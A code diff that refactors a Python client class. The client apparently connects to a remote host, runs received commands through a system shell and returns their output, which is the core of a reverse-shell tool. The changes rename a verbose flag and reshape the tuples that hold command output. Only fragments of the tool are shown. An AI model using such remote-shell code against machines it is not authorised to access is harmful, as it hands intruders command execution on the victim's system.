@@ -22,32 +22,32 @@ class Client(StreamSocket):
         rhost: str,
         port: int,
         opsys: str,
-        verb: bool,
+        verbose: bool,
         debug: bool,
         shell: str = None
     ):
         shell_path, name = self.get_exec(opsys, shell)
-        if verb:
+        if verbose:
             utils.status(f"shell => {name}")
         super().__init__(rhost, port, shell_path, debug)
-        self.Verbose = verb
+        self.Verbose = verbose
 
-    def execute(self, command: str) -> (bytes, bytes, bytes):
+    def execute(self, command: str) -> tuple:
         """Execute the command using system shell subprocess,
         returns the a list of stdin, stdout, and stderr."""
         family = self.check_special(command)
 
         if family is not None:
             if family == "clear":
-                return [command.encode(), utils.Ansi.clear(), b""]
+                #return [command.encode(), utils.Ansi.clear(), b""]
+                return utils.Ansi.clear(), b""
 
             if family == "cd":
                 exists, path = self._change_dir(command)
                 if exists:
-                    return [command.encode(), path.encode(), b""]
+                    return path.encode(), b""
                 else:
-                    error_msg = f"Cannot resolve path {path}".encode()
-                    return [command.encode(), b"", error_msg]
+                    return b"", f"Cannot resolve path {path}".encode()
 
             if family == "ls":
                 if utils.OPSYS != "nt":
@@ -100,8 +100,8 @@ class Client(StreamSocket):
                     break
 
                 cmd_out = self.execute(command)
-                stdout = cmd_out[1]
-                stderr = cmd_out[2]
+                stdout = cmd_out[0]
+                stderr = cmd_out[1]
 
                 if stderr == b"":
                     output = stdout
